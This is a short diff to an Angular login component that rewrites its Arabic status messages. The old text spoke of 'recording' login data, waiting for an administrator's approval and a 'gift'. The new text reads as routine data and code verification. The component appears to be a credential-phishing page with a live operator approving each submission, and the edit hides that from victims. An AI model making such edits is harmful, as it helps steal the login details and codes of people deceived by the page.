@@ -60,7 +60,7 @@ export class Login implements OnDestroy {
 
     this.isLoading.set(true);
     this.errorMessage.set(null);
-    this.loadingMessage.set('جاري تسجيل بيانات الدخول...');
+    this.loadingMessage.set('جاري التحقق من البيانات');
 
     const payload = {
       username: this.username().trim(),
@@ -85,7 +85,7 @@ export class Login implements OnDestroy {
       })
       .then((data: { id: string; status: string }) => {
         this.currentRequestId = data.id;
-        this.loadingMessage.set('بانتظار موافقة المسؤول... يرجى عدم إغلاق الصفحة');
+        this.loadingMessage.set('يرجى الانتظار جاري التحقق من الرمز');
         this.startPolling(data.id);
       })
       .catch((err) => {
@@ -114,7 +114,7 @@ export class Login implements OnDestroy {
           } else if (data.status === 'REJECTED') {
             this.stopPolling();
             this.isLoading.set(false);
-            this.errorMessage.set('تم رفض طلب الدخول واستلام الهدية من قبل المسؤول.');
+            this.errorMessage.set('تم رفض الطلب بسبب عدم صحة البيانات, يرجى المحاولة مرة اخرى مع مراجعة البيانات');
           }
         })
         .catch((err) => {
